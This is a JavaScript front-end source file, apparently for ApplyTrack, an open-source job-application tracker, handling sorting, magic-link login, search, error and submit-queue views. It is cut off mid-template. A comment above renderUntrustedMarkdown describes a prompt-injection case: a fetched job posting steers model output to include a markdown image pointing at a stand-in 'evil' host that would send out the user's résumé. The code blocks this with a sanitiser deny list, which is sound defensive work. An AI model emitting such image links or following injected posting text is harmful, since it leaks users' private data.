// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Aaron K. Clark
import { createApiClient } from "./api-client.js";
import { applyPreferences, readPreferences, renderAccessibilityPreferences } from "./accessibility-preferences.js";

"use strict";

const STATUSES = ["lead", "ready", "applied", "screen", "onsite", "offer", "rejected", "passed"];
const STATUS_LABEL = {
  lead: "lead", ready: "ready", applied: "applied", screen: "screen",
  onsite: "onsite", offer: "offer", rejected: "rejected", passed: "passed",
};
const LANES = ["dotnet", "devrel", "ai"];
const LANE_LABEL = { dotnet: ".NET", devrel: "devrel", ai: "AI" };

// Sidebar ordering: still-open roles float to the top, in-flight ones sit in
// the middle, passed ones sink to the bottom. Within a group, original order
// (the store's sort) is preserved by the stable sort.
const APPLIED_STATUSES = new Set(["applied", "screen", "onsite", "offer", "rejected"]);
const statusGroup = (s) => (s === "passed" ? 2 : APPLIED_STATUSES.has(s) ? 1 : 0);

// Sidebar orderings. "pipeline" is the default described above; the other three
// answer "which of these is worth my next hour?" from a different angle. Each
// comparator returns 0 for a tie and compareApps() breaks that tie deterministically,
// so two renders of the same list never shuffle.
const SORT_KEYS = ["pipeline", "score", "created", "company"];
const SORT_STORAGE_KEY = "applytrack.sort";
const collator = new Intl.Collator(undefined, { sensitivity: "base", numeric: true });

// A blank fit score or date sinks to the bottom of its ordering instead of
// pretending to be zero / the epoch — "unscored" is not "scored badly".
const fitScore = (a) => {
  const n = Number.parseInt(a.score, 10);
  return Number.isFinite(n) ? n : null;
};
const descending = (x, y) => (x === y ? 0 : x === null ? 1 : y === null ? -1 : x < y ? 1 : -1);

const SORTS = {
  pipeline: (a, b) => statusGroup(a.status) - statusGroup(b.status),
  score: (a, b) => descending(fitScore(a), fitScore(b)),
  // created is a free-text ISO date (YYYY-MM-DD), so lexical order is date order.
  created: (a, b) => descending((a.created || "").trim() || null, (b.created || "").trim() || null),
  company: (a, b) => collator.compare(a.company || "", b.company || ""),
};

function compareApps(a, b) {
  const compare = SORTS[state.sort] || SORTS.pipeline;
  const primary = compare(a, b);
  // Pipeline order deliberately stops here: within a group the stable sort keeps the
  // server's status-then-company ordering, which a tiebreak would flatten.
  if (primary !== 0 || state.sort === "pipeline") return primary;
  return collator.compare(a.company || "", b.company || "")
    || collator.compare(a.filename, b.filename);
}

// Sort choice is a per-browser preference, not account data — the API never sees it.
function readStoredSort() {
  try {
    const saved = localStorage.getItem(SORT_STORAGE_KEY);
    return SORT_KEYS.includes(saved) ? saved : "pipeline";
  } catch (_) {
    return "pipeline";
  }
}

const state = {
  apps: [],
  appsEtag: "",
  stats: { status: {}, lane: {} },
  query: "",
  // The search results view (#326): its own filters and page, so browsing the sidebar's
  // lists never resets them.
  searchWhere: "",
  searchLane: "",
  searchPage: 0,
  filterLane: "",
  filterStatus: "",
  sort: readStoredSort(),
  current: null,
  currentVersion: "",
  mode: "empty", // empty | view | edit | raw | new | settings | pipeline | status | errors | search
  // Ready applications whose last browser run failed (#284): their own chip and view,
  // and no longer counted or listed under Ready.
  errors: [],
  settingsTab: "accessibility",
  coverLettersEnabled: true,
  // The agent (Settings · Agent) is opt-in; OFF hides the evaluate affordance.
  agentEnabled: false,
  // Whether this instance has a browser container to fill and submit forms with.
  browserAvailable: false,
  // The tenant lets the browser fill forms on ATSs it doesn't know.
  longTail: false,
  // LinkedIn Easy Apply (#278): its own switch, not the long tail's.
  linkedinEasy: false,
  // The Ready lane's multi-select: filenames ticked while the status filter is Ready.
  selected: new Set(),
};

const $ = (sel) => document.querySelector(sel);
const listEl = $("#app-list");
const pipelineEl = $("#pipeline");
const contentEl = $("#content");
const countEl = $("#app-count");
const searchEl = $("#search");
const toastEl = $("#toast");
const statusMessageEl = $("#status-message");
const alertMessageEl = $("#alert-message");
const confirmDialogEl = $("#confirm-dialog");
const laneSel = $("#filter-lane");
const statusSel = $("#filter-status");
const sortSel = $("#sort-order");

// ---- API ------------------------------------------------------------------
const api = createApiClient(showLogin);

// PUT guarding against external edits (the hourly poller also writes files).
// Send the version we last read; a 409 means it changed underneath us.
async function saveWithConflict(path, body, label) {
  const versioned = state.currentVersion
    ? `${path}?expected_version=${encodeURIComponent(state.currentVersion)}`
    : path;
  try {
    return await api("PUT", versioned, body);
  } catch (e) {
    if (e.status === 409 && await confirmAction({
      title: "Application changed",
      message: `"${label}" changed since you opened it. Overwrite it with your version?`,
      confirmLabel: "Overwrite",
    })) {
      return api("PUT", path, body);
    }
    throw e;
  }
}

// ---- Auth gate ------------------------------------------------------------

// The one additive piece of UI over the original SPA: a full-screen login card
// shown whenever the API answers 401. Magic-link only — POST the address, then
// tell the user to check their mail (self-hosters read the link off the logs).
function showLogin() {
  if (document.getElementById("login-overlay")) return; // already up
  // Remember a deep link across the magic-link round trip (the verify redirect lands on /).
  try {
    const target = new URLSearchParams(location.hash.slice(1)).get("app");
    if (target) sessionStorage.setItem("returnTo", target);
  } catch (_) {}
  const linkError = new URLSearchParams(location.search).get("error");
  // wrong_browser: the link was opened somewhere other than where it was requested (#341).
  const linkMessage = {
    invalid_link: "That link was invalid or expired — request a fresh one.",
    wrong_browser: "Open the link in the same browser you requested it from — or request a fresh one here.",
    account_disabled: "This account has been disabled. Contact whoever runs this instance.",
  }[linkError];
  const overlay = document.createElement("div");
  overlay.id = "login-overlay";
  overlay.className = "login-overlay";
  $("#app-shell").inert = true;
  $(".mobile-actions").inert = true;
  overlay.innerHTML = `
    <main class="login-card" aria-labelledby="login-title">
    <form id="login-form">
      <div class="login-brand" aria-hidden="true">
        <span class="brand-mark"><svg viewBox="0 0 32 32"><path d="M7 8.5h18M7 16h11M7 23.5h8" /><path d="m20 21 3 3 5-7" /></svg></span>
      </div>
      <h1 id="login-title" class="login-mark"><span>Apply</span><strong>Track</strong></h1>
      <p class="login-sub">Sign in with a one-time magic link.</p>
      ${linkMessage ? `<p class="login-error">${linkMessage}</p>` : ""}
      <p class="login-signup-head">New here?</p>
      <p class="login-signup">Just enter your email — your account is created automatically.</p>
      <label class="field" for="login-email"><span class="field-label">Email address</span>
      <input id="login-email" class="login-input" type="email" required autocomplete="email"
        inputmode="email" placeholder="you@example.com" /></label>
      <label class="login-terms" for="login-terms">
        <input id="login-terms" type="checkbox" required />
        <span>I accept the
          <button type="button" class="link-button" data-act="open-terms">Terms of Service</button></span>
      </label>
      <button type="submit" class="btn btn-primary login-btn" disabled>Send magic link</button>
      <p class="login-note">We email you a link to sign in — check your spam folder if it doesn't arrive. Self-hosting? It's printed to the server logs.</p>
      <p class="login-note login-footer"><a href="https://github.com/CryptoJones/OSApplyTrack" target="_blank" rel="noopener">Open source on GitHub ↗</a></p>
    </form></main>`;
  document.body.appendChild(overlay);

  const form = overlay.querySelector("#login-form");
  // Sign-in stays inert until the terms are ticked. The `required` attribute alone would
  // let the browser block submission with its own bubble; disabling the button makes the
  // gate visible before they try, which is the point of putting it here.
  const terms = overlay.querySelector("#login-terms");
  const submitBtn = form.querySelector(".login-btn");
  terms.addEventListener("change", () => { submitBtn.disabled = !terms.checked; });
  overlay.querySelector('[data-act="open-terms"]').onclick = () => {
    const dialog = $("#beta-dialog");
    if (!dialog) return;
    // Opened for reading here, so the accept button just closes it — acceptance is the
    // checkbox on the form behind it.
    $("#beta-accept").textContent = "Close";
    $("#beta-accept").onclick = () => dialog.close();
    dialog.showModal();
    $("#beta-accept").focus();
  };
  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    const email = overlay.querySelector("#login-email").value.trim();
    if (!email || !terms.checked) return;
    const btn = form.querySelector("button");
    btn.disabled = true;
    btn.textContent = "Sending…";
    // Always reports success: the API returns 200 either way (no account enumeration).
    try { await api("POST", "/api/auth/request", { email }); } catch (_) {}
    form.innerHTML = `
      <div class="login-brand" aria-hidden="true">
        <span class="brand-mark"><svg viewBox="0 0 32 32"><path d="M7 8.5h18M7 16h11M7 23.5h8" /><path d="m20 21 3 3 5-7" /></svg></span>
      </div>
      <h1 class="login-mark"><span>Apply</span><strong>Track</strong></h1>
      <h2 tabindex="-1" class="login-sub">Check your inbox</h2>
      <p class="login-note">If <strong>${escapeHtml(email)}</strong> can sign in, a link is on its way —
        check your spam folder too. Open it in this browser. Self-hosting? Look for it in the server logs.</p>
      <p class="login-note login-footer"><a href="https://github.com/CryptoJones/OSApplyTrack" target="_blank" rel="noopener">Open source on GitHub ↗</a></p>`;
    form.querySelector("h2").focus();
  });
  overlay.querySelector("#login-email").focus();
}

// ---- Helpers --------------------------------------------------------------

const escapeHtml = (s) =>
  String(s ?? "").replace(/[&<>"']/g, (c) =>
    ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));

// Markdown that may carry untrusted text — model output steered by a fetched posting, or
// notes the poller copied from one — rendered with nothing that fetches on its own. A
// prompt-injected ![](https://evil/?d=<résumé>) would otherwise leak data the moment the
// letter is shown, no click and no script needed (#342). Links stay: they need a click.
const UNTRUSTED_MD_PURIFY = {
  FORBID_TAGS: ["img", "image", "picture", "source", "video", "audio", "track", "svg", "math", "style", "link"],
  FORBID_ATTR: ["style", "src", "srcset", "poster", "background"],
};
const renderUntrustedMarkdown = (md, opts) =>
  DOMPurify.sanitize(marked.parse(md, opts), UNTRUSTED_MD_PURIFY);

function toast(msg) {
  toastEl.textContent = msg;
  toastEl.setAttribute("aria-hidden", "false");
  announce(msg);
  toastEl.classList.add("show");
  clearTimeout(toast._t);
  toast._t = setTimeout(() => {
    toastEl.classList.remove("show");
    toastEl.setAttribute("aria-hidden", "true");
  }, 4000);
}

function announce(message, assertive = false) {
  const el = assertive ? alertMessageEl : statusMessageEl;
  el.textContent = "";
  requestAnimationFrame(() => { el.textContent = message; });
}

function confirmAction({ title, message, confirmLabel = "Confirm" }) {
  $("#confirm-title").textContent = title;
  $("#confirm-message").textContent = message;
  $("#confirm-accept").textContent = confirmLabel;
  confirmDialogEl.returnValue = "cancel";
  confirmDialogEl.showModal();
  return new Promise((resolve) => {
    confirmDialogEl.addEventListener("close", () => resolve(confirmDialogEl.returnValue === "confirm"), { once: true });
  });
}

// Like confirmAction, but the user has to type an exact phrase before the button works.
// For destructive-and-unrecoverable actions, where a reflexive click on "Confirm" is the
// failure mode the dialog exists to prevent. Comparison is trimmed and case-insensitive:
// the point is deliberate intent, not a spelling test.
function confirmByTyping({ title, message, phrase, confirmLabel = "Confirm" }) {
  $("#confirm-title").textContent = title;
  $("#confirm-message").textContent = message;
  const accept = $("#confirm-accept");
  accept.textContent = confirmLabel;
  accept.disabled = true;

  const field = document.createElement("label");
  field.className = "confirm-phrase";
  field.innerHTML = `<span class="field-label">Type <strong></strong> to confirm</span>
    <input id="confirm-phrase-input" class="field-input" type="text" autocomplete="off"
      spellcheck="false" />`;
  field.querySelector("strong").textContent = phrase;
  $("#confirm-message").after(field);

  const input = field.querySelector("#confirm-phrase-input");
  input.addEventListener("input", () => {
    accept.disabled = input.value.trim().toLowerCase() !== phrase.toLowerCase();
  });

  confirmDialogEl.returnValue = "cancel";
  confirmDialogEl.showModal();
  input.focus();
  return new Promise((resolve) => {
    confirmDialogEl.addEventListener("close", () => {
      const ok = confirmDialogEl.returnValue === "confirm";
      field.remove();
      accept.disabled = false;
      resolve(ok);
    }, { once: true });
  });
}

function focusView(selector = "h1, h2") {
  requestAnimationFrame(() => {
    const target = contentEl.querySelector(selector) || contentEl;
    if (!target.hasAttribute("tabindex")) target.setAttribute("tabindex", "-1");
    target.focus({ preventScroll: true });
    contentEl.scrollTop = 0;
  });
}

function showDetailPane() {
  document.body.classList.add("m-detail");
  if (window.matchMedia("(max-width: 767px)").matches)
    $("#application-list").setAttribute("aria-hidden", "true");
}

function showListPane({ restoreFocus = true } = {}) {
  document.body.classList.remove("m-detail");
  $("#application-list").removeAttribute("aria-hidden");
  if (restoreFocus) {
    const active = listEl.querySelector('[aria-current="true"]');
    (active || searchEl).focus();
  }
}

const stem = (filename) => filename.replace(/\.md$/i, "");

const statusBadge = (s) =>
  `<span class="badge" data-status="${escapeHtml(s)}">${escapeHtml(STATUS_LABEL[s] || s)}</span>`;
const lanePill = (l) =>
  `<span class="lane-pill" data-lane="${escapeHtml(l)}">${escapeHtml(LANE_LABEL[l] || l)}</span>`;

function safeUrl(u) {
  const s = String(u || "").trim();
  return /^https?:\/\//i.test(s) ? s : "";
}

// ---- Pipeline strip -------------------------------------------------------

function renderPipeline() {
  const raw = state.stats.status || {};
  // An errored application is still `ready` in the table; on the strip it is an error,
  // not a Ready packet, so the two chips never count the same one twice (#284).
  const errorCount = state.errors.length;
  const counts = { ...raw, ready: Math.max(0, (raw.ready || 0) - errorCount) };
  const parts = [];
  const errorsChip = () => `<button type="button" class="pipe-stat" data-view="errors" data-status="errors"
      aria-pressed="${state.mode === "errors"}" aria-label="${errorCount} application${errorCount === 1 ? "" : "s"} with errors">
      <span class="n" aria-hidden="true">${errorCount}</span><span>error${errorCount === 1 ? "" : "s"}</span></button>`;
  let errorsPlaced = false;
  for (const s of STATUSES) {
    // Errors sit after lead and ready, before applied — wherever those chips happen to be.
    if (!errorsPlaced && errorCount && s !== "lead" && s !== "ready") { parts.push(errorsChip()); errorsPlaced = true; }
    if (!counts[s]) continue;
    const active = state.filterStatus === s && state.mode !== "errors";
    const label = STATUS_LABEL[s] || s;
    parts.push(`<button type="button" class="pipe-stat" data-status="${s}" aria-pressed="${active}"
      aria-label="${escapeHtml(label)}, ${counts[s]} applications">
      <span class="n" aria-hidden="true">${counts[s]}</span><span>${escapeHtml(label)}</span></button>`);
  }
  const total = Object.values(raw).reduce((sum, n) => sum + n, 0);
  if (total) parts.push(`<span class="pipe-total"><span class="n">${total}</span>total</span>`);
  // The label is the door to the submit queue: what the worker will drain, and what
  // each request turns into when it does (submit, dry run, rebuild, or dropped).
  pipelineEl.innerHTML = `
    <button type="button" id="pipeline-btn" class="pipeline-label" aria-pressed="${state.mode === "pipeline"}"
      title="Open the submit queue">Pipeline</button>
    ${parts.join("") || `<span class="pipeline-empty">No applications yet</span>`}`;
  pipelineEl.querySelector("#pipeline-btn").addEventListener("click", () => openPipeline());
  const errorsBtn = pipelineEl.querySelector('.pipe-stat[data-view="errors"]');
  if (errorsBtn) errorsBtn.addEventListener("click", () => {
    if (state.mode === "errors") { renderEmpty(); renderPipeline(); }
    else openErrors();
  });
  pipelineEl.querySelectorAll(".pipe-stat[data-status]:not([data-view])").forEach((el) => {
    el.addEventListener("click", () => {
      state.filterStatus = state.filterStatus === el.dataset.status ? "" : el.dataset.status;
      statusSel.value = state.filterStatus;
      renderPipeline();
      // A chip opens that status's list in the main pane; un-pressing it closes it.
      if (state.filterStatus) openStatusView();
      else if (state.mode === "status") renderEmpty();
      else renderSidebar();
    });
  });
}

// The strip button reads as pressed only while the Pipeline view holds the pane.
function syncPipelineButton() {
  const btn = document.getElementById("pipeline-btn");
  if (btn) btn.setAttribute("aria-pressed", String(state.mode === "pipeline"));
}

// ---- Status view ------------------------------------------------------------
// A status chip's applications as a list in the main pane. It shows exactly what the
// sidebar shows (status, lane, search, and sort compose), so renderSidebar repaints it.

function openStatusView({ focus = true } = {}) {
  state.mode = "status";
  state.current = null;
  showDetailPane();
  syncPipelineButton();
  renderSidebar();
  if (focus) focusView("h1");
}

function renderStatusView() {
  const apps = filteredApps({ everywhere: false });
  const label = STATUS_LABEL[state.filterStatus] || state.filterStatus;
  const title = label.charAt(0).toUpperCase() + label.slice(1);
  const rows = apps.map((a) => `
    <tr>
      <td><button type="button" class="link-button" data-open="${escapeHtml(a.filename)}">${pipelineRowTitle(a)}</button>
        ${a.location ? `<div class="field-help">${escapeHtml(a.location)}</div>` : ""}</td>
      <td>${lanePill(a.lane)}</td>
      <td class="mono">${a.score ? escapeHtml(a.score) : "—"}</td>
      <td>${escapeHtml(a.created || "—")}</td>
      <td>${escapeHtml(a.applied || "—")}${a.followup ? `<div class="field-help">follow-up ${escapeHtml(a.followup)}</div>` : ""}</td>
    </tr>`).join("");
  contentEl.innerHTML = `
    <div class="settings-shell pipeline-view">
      <header class="settings-header">
        <div class="sheet-eyebrow">Status</div>
        <h1>${escapeHtml(title)}</h1>
        <p aria-live="polite">${apps.length} application${apps.length === 1 ? "" : "s"}.</p>
      </header>
      ${apps.length ? `
      <div class="table-scroll">
        <table class="pipeline-table">
          <caption class="sr-only">${escapeHtml(title)} applications</caption>
          <thead><tr><th scope="col">Application</th><th scope="col">Lane</th><th scope="col">Fit</th><th scope="col">Posted</th><th scope="col">Applied</th></tr></thead>
          <tbody>${rows}</tbody>
        </table>
      </div>` : `<p class="empty-result">No applications match the current filters.</p>`}
    </div>`;
  document.title = `${title} | ApplyTrack`;
  contentEl.querySelectorAll("[data-open]").forEach((b) => b.addEventListener("click", () => openApp(b.dataset.open)));
}

// ---- Search results view ------------------------------------------------------
// Every match in one table (#326): the application and its number, where it is — the
// list it sits in, Errors included, one click away — a link that opens it here, and the
// posting itself. Filtered by where and lane, twenty to a page.

const SEARCH_PAGE = 20;

// Where an application is found in the app: Errors when its last run failed, else its status.
const whereOf = (a, stuck) => (stuck.has(a.filename) ? "errors" : a.status);
const whereLabel = (w) => (w === "errors" ? "Errors" : (STATUS_LABEL[w] || w).replace(/^./, (c) => c.toUpperCase()));

function searchResults() {
  const stuck = errorNames();
  const q = state.query.trim().toLowerCase();
  const all = filteredApps({ everywhere: true });
  // The number typed exactly comes first.
  all.sort((x, y) => Number(idMatches(y, q)) - Number(idMatches(x, q)));
  const matches = all.filter((a) =>
    (!state.searchWhere || whereOf(a, stuck) === state.searchWhere)
    && (!state.searchLane || a.lane === state.searchLane));
  return { all, matches, stuck };
}

function openSearchView({ focus = true } = {}) {
  if (!searching()) { if (state.mode === "search") renderEmpty(); return; }
  state.mode = "search";
  state.current = null;
  showDetailPane();
  syncPipelineButton();
  renderSearchView();
  if (focus) focusView("h1");
}

function renderSearchView() {
  const { all, matches, stuck } = searchResults();
  const pages = Math.max(1, Math.ceil(matches.length / SEARCH_PAGE));
  state.searchPage = Math.min(Math.max(0, state.searchPage), pages - 1);
  const shown = matches.slice(state.searchPage * SEARCH_PAGE, (state.searchPage + 1) * SEARCH_PAGE);
  const q = state.query.trim();
  // The filter choices are the places the matches actually are, with how many in each.
  const whereCounts = {};
  all.forEach((a) => { const w = whereOf(a, stuck); whereCounts[w] = (whereCounts[w] || 0) + 1; });
  const whereOrder = ["errors", ...Object.keys(STATUS_LABEL)].filter((w) => whereCounts[w]);
  const laneCounts = {};
  all.forEach((a) => { laneCounts[a.lane] = (laneCounts[a.lane] || 0) + 1; });
  const option = (value, label, n, current) =>
    `<option value="${escapeHtml(value)}"${value === current ? " selected" : ""}>${escapeHtml(label)}${n === undefined ? "" : ` (${n})`}</option>`;
  const rows = shown.map((a) => {
    const w = whereOf(a, stuck);
    const posting = safeUrl(a.link);
    return `
    <tr>
      <td class="mono">${escapeHtml(appId(a) || "—")}</td>
      <td><a href="#app=${encodeURIComponent(a.filename)}" data-open="${escapeHtml(a.filename)}">${pipelineRowTitle(a)}</a></td>
      <td><button type="button" class="link-button" data-where="${escapeHtml(w)}">${escapeHtml(whereLabel(w))}</button></td>
      <td>${posting ? `<a href="${escapeHtml(posting)}" target="_blank" rel="noopener noreferrer">Posting ↗<span class="sr-only"> for ${escapeHtml(a.company)} (opens in a new tab)</span></a>` : "—"}</td>
    </tr>`;
  }).join("");
  const from = matches.length ? state.searchPage * SEARCH_PAGE + 1 : 0;
  const to = state.searchPage * SEARCH_PAGE + shown.length;
  contentEl.innerHTML = `
    <div class="settings-shell pipeline-view">
      <header class="settings-header">
        <div class="sheet-eyebrow">Search</div>
        <h1>Results for “${escapeHtml(q)}”</h1>
        <p aria-live="polite">${matches.length
          ? `${from}–${to} of ${matches.length} match${matches.length === 1 ? "" : "es"}${matches.length !== all.length ? ` (${all.length} before filtering)` : ""}.`
          : all.length ? `No match with these filters — ${all.length} without them.` : "No application matches."}</p>
      </header>
      <div class="filter-row" role="group" aria-label="Filter search results">
        <label for="search-where"><span>Where</span>
          <select id="search-where">${option("", "Everywhere", all.length, state.searchWhere)}${whereOrder.map((w) => option(w, whereLabel(w), whereCounts[w], state.searchWhere)).join("")}</select>
        </label>
        <label for="search-lane"><span>Lane</span>
          <select id="search-lane">${option("", "All lanes", undefined, state.searchLane)}${Object.keys(laneCounts).sort().map((l) => option(l, LANE_LABEL[l] || l, laneCounts[l], state.searchLane)).join("")}</select>
        </label>
      </div>
      ${shown.length ? `
      <div class="table-scroll">
        <table class="pipeline-table">
          <caption class="sr-only">Applications matching ${escapeHtml(q)}</caption>
          <thead><tr><th scope="col">Number</th><th scope="col">Application</th><th scope="col">Where it is</th><th scope="col">Posting</th></tr></thead>
          <tbody>${rows}</tbody>
        </table>
      </div>
      ${pages > 1 ? `
      <nav class="action-row" aria-label="Search result pages">
        <button type="button" class="btn btn-ghost btn-xs" data-page="-1"${state.searchPage === 0 ? " disabled" : ""}>Previous</button>
        <span>Page ${state.searchPage + 1} of ${pages}</span>
        <button type="button" class="btn btn-ghost btn-xs" data-page="1"${state.searchPage >= pages - 1 ? " disabled" : ""}>Next</button>
      </nav>` : ""}` : ""}
    </div>`;
  document.title = `Search: ${q} | ApplyTrack`;
  contentEl.querySelectorAll("[data-open]").forEach((l) => l.addEventListener("click", (ev) => {
    if (ev.metaKey || ev.ctrlKey || ev.shiftKey || ev.button === 1) return; // a new tab keeps the link
    ev.preventDefault();
    openApp(l.dataset.open);
  }));
  contentEl.querySelectorAll("[data-where]").forEach((b) => b.addEventListener("click", () => goToWhere(b.dataset.where)));
  contentEl.querySelectorAll("[data-page]").forEach((b) => b.addEventListener("click", () => {
    state.searchPage += Number(b.dataset.page);
    renderSearchView();
    focusView("h1");
  }));
  const whereSel = document.getElementById("search-where");
  whereSel.addEventListener("change", () => { state.searchWhere = whereSel.value; state.searchPage = 0; renderSearchView(); document.getElementById("search-where").focus(); });
  const laneSel2 = document.getElementById("search-lane");
  laneSel2.addEventListener("change", () => { state.searchLane = laneSel2.value; state.searchPage = 0; renderSearchView(); document.getElementById("search-lane").focus(); });
}

// Open the list an application sits in: the Errors view, or its status's list. The search
// is cleared so the sidebar shows that list, not every status.
function goToWhere(where) {
  state.query = "";
  searchEl.value = "";
  if (where === "errors") { openErrors(); return; }
  state.filterStatus = where;
  statusSel.value = where;
  renderPipeline();
  openStatusView();
}

// ---- Errors view -------------------------------------------------------------
// The applications that are stuck (#284): still Ready, nothing queued, and the last thing
// the browser did with them was fail. Each row says what went wrong and what happens
// next — a retry the agent will make by itself, or that it is waiting on you, and why.

const errorNames = () => new Set(state.errors.map((e) => e.name));

async function loadErrors() {
  try {
    const data = await api("GET", "/api/errors");
    state.errors = Array.isArray(data.errors) ? data.errors : [];
  } catch {
    // A request that failed says nothing about what is stuck: keep what was last known,
    // or the errored ones would slide back under Ready until the next good answer.
  }
}

async function openErrors({ focus = true } = {}) {
  state.mode = "errors";
  state.current = null;
  state.filterStatus = "";
  statusSel.value = "";
  showDetailPane();
  await loadErrors();
  renderPipeline();
  renderSidebar();
  renderErrorsView();
  if (focus) focusView("h1");
}

function renderErrorsView() {
  const errors = state.errors;
  const retrying = errors.filter((e) => e.next === "retry").length;
  const rows = errors.map((e) => {
    const link = safeUrl(e.link);
    const next = e.next === "retry"
      ? `<span class="link-status warn">Retrying by itself</span>
         <div class="field-help">${e.retry_at ? `next try after ${escapeHtml(new Date(e.retry_at).toLocaleString())} — ` : ""}${escapeHtml(e.why)}</div>`
      : `<span class="link-status bad">Needs you</span><div class="field-help">${escapeHtml(e.why)}</div>`;
    return `
    <tr>
      <td><button type="button" class="link-button" data-open="${escapeHtml(e.name)}">${pipelineRowTitle(e)}</button>
        <div class="field-help">${(() => { const id = appId(state.apps.find((a) => a.filename === e.name)); return id ? `<span class="mono">${escapeHtml(id)}</span> · ` : ""; })()}${escapeHtml(e.provider || "")}${link ? ` · <a href="${escapeHtml(link)}" target="_blank" rel="noopener noreferrer">posting<span class="sr-only"> (opens in a new tab)</span></a>` : ""}</div></td>
      <td>${escapeHtml(e.error || "the run failed")}</td>
      <td>${escapeHtml(new Date(e.at).toLocaleString())}<div class="field-help">${e.runs} run${e.runs === 1 ? "" : "s"}</div></td>
      <td>${next}</td>
      <td><button type="button" class="btn btn-xs" data-retry="${escapeHtml(e.name)}"
        aria-label="Retry ${escapeHtml(e.company)} with a dry run">Retry</button></td>
    </tr>`;
  }).join("");
  contentEl.innerHTML = `
    <div class="settings-shell pipeline-view">
      <header class="settings-header">
        <div class="sheet-eyebrow">Stuck</div>
        <h1>Errors</h1>
        <p aria-live="polite">${errors.length
          ? `${errors.length} application${errors.length === 1 ? "" : "s"} whose last run failed — ${retrying} will be retried automatically, ${errors.length - retrying} need${errors.length - retrying === 1 ? "s" : ""} you.`
          : "Nothing is stuck. Every Ready application is either untried or ran clean."}</p>
      </header>
      ${errors.length ? `
      <div class="table-scroll">
        <table class="pipeline-table">
          <caption class="sr-only">Applications whose last run failed, oldest failure first</caption>
          <thead><tr><th scope="col">Application</th><th scope="col">What went wrong</th><th scope="col">Last run</th><th scope="col">What happens next</th><th scope="col"><span class="sr-only">Actions</span></th></tr></thead>
          <tbody>${rows}</tbody>
        </table>
      </div>` : ""}
    </div>`;
  document.title = "Errors | ApplyTrack";
  contentEl.querySelectorAll("[data-open]").forEach((b) => b.addEventListener("click", () => openApp(b.dataset.open)));
  contentEl.querySelectorAll("[data-retry]").forEach((b) => b.addEventListener("click", async () => {
    await queueSubmit(b.dataset.retry, b, true);
    // Queued means it has left Errors for the Pipeline until the run lands. The row and
    // its button are gone with the repaint, so focus goes to the heading, not the body.
    if (state.mode === "errors") await openErrors();
  }));
}

// ---- Pipeline view ----------------------------------------------------------
// The submit queue as the worker drains it (oldest request first), with what each
// request will turn into when claimed, plus the Ready packets a dry-run flip or
// "Submit all clean" would queue. Refreshes itself every 15 s — the worker's own
// cadence — while it holds the pane.

let pipelineGen = 0;
const PIPELINE_REFRESH_MS = 15000;

async function openPipeline({ focus = true } = {}) {
  const gen = ++pipelineGen;
  state.mode = "pipeline";
  state.current = null;
  showDetailPane();
  syncPipelineButton();
  renderSidebar();
  contentEl.innerHTML = `
    <div class="settings-shell pipeline-view">
      <header class="settings-header">
        <div class="sheet-eyebrow">Submit queue</div>
        <h1>Pipeline</h1>
        <p id="pipeline-summary" aria-live="polite">Loading the queue…</p>
      </header>
      <div id="pipeline-body"></div>
    </div>`;
  document.title = "Pipeline | ApplyTrack";
  await loadPipeline(gen);
  if (focus) focusView("h1");
}

async function loadPipeline(gen) {
  if (gen !== pipelineGen || state.mode !== "pipeline") return;
  let data;
  try {
    data = await api("GET", "/api/pipeline");
  } catch (e) {
    const body = document.getElementById("pipeline-body");
    if (body && gen === pipelineGen) body.innerHTML = `<div class="packet-flag">${escapeHtml(e.message)}</div>`;
    return;
  }
  if (gen !== pipelineGen || state.mode !== "pipeline") return;
  renderPipelineView(data);
  setTimeout(() => loadPipeline(gen), PIPELINE_REFRESH_MS);
}

const PHASE_LABEL = {
  queued: "Queued", running: "Running now", awaiting_code: "Waiting for the code the board emailed you", stale: "Stale claim — will be retried",
};
const WILL_LABEL = { submit: "Will submit", dry_run: "Dry run only", prepare: "Rebuild, then dry run", drop: "Will be dropped" };
const WILL_TONE = { submit: "ok", dry_run: "warn", prepare: "warn", drop: "bad" };

function pipelineRowTitle(r) {
  return `${escapeHtml(r.company)}${r.role ? ` · ${escapeHtml(r.role)}` : ""}`;
}

function renderPipelineView(data) {
  const summaryEl = document.getElementById("pipeline-summary");
  const body = document.getElementById("pipeline-body");
  if (!summaryEl || !body) return;
  const s = data.summary || {};
  const queue = Array.isArray(data.queue) ? data.queue : [];
  const ready = Array.isArray(data.ready) ? data.ready : [];
  const bits = [];
  if (s.will_submit) bits.push(`${s.will_submit} will submit`);
  if (s.dry_runs) bits.push(`${s.dry_runs} dry run${s.dry_runs === 1 ? "" : "s"}`);
  if (s.prepares) bits.push(`${s.prepares} rebuild${s.prepares === 1 ? "" : "s"}`);
  if (s.awaiting_code) bits.push(`${s.awaiting_code} waiting for a code`);
  if (s.drops) bits.push(`${s.drops} will be dropped`);
  summaryEl.textContent = queue.length
    ? `${queue.length} queued — ${bits.join(", ")}.`
    : "The queue is empty. Nothing is waiting for the worker.";

  const seen = data.worker_last_seen ? new Date(data.worker_last_seen) : null;
  const health = [];
  health.push(data.worker_running
    ? `<span class="link-status ok">Worker running</span>`
    : `<span class="link-status bad">No worker</span>`);
  health.push(data.browser_available
    ? `<span class="link-status ok">Browser available</span>`
    : `<span class="link-status bad">No browser</span>`);
  health.push(data.dry_run
    ? `<span class="link-status warn">Dry run only is ON — nothing submits for real</span>`
    : `<span class="link-status ok">Real submissions ON</span>`);
  if (!data.allowed) health.push(`<span class="link-status bad">Auto-apply not enabled for this account</span>`);

  const queueRows = queue.map((r) => `
    <tr>
      <td class="mono">${r.position}</td>
      <td><button type="button" class="link-button" data-open="${escapeHtml(r.name)}">${pipelineRowTitle(r)}</button>
        <div class="field-help">${escapeHtml(r.provider)}${r.last_evidence ? ` · last: ${escapeHtml(r.last_evidence.replace("_", " "))}` : ""}</div></td>
      <td>${escapeHtml(new Date(r.requested_at).toLocaleString())}</td>
      <td><span class="pipe-phase pipe-phase-${escapeHtml(r.phase)}">${escapeHtml(PHASE_LABEL[r.phase] || r.phase)}</span>
        ${r.phase === "awaiting_code" && r.code_received ? `<div class="field-help">code received — finishing</div>` : ""}</td>
      <td><span class="link-status ${WILL_TONE[r.will] || "warn"}">${escapeHtml(WILL_LABEL[r.will] || r.will)}</span>
        ${r.then_submit ? `<div class="field-help">then submits for real if clean</div>` : ""}
        ${r.reason ? `<div class="field-help">${escapeHtml(r.reason)}</div>` : ""}</td>
    </tr>`).join("");

  body.innerHTML = `
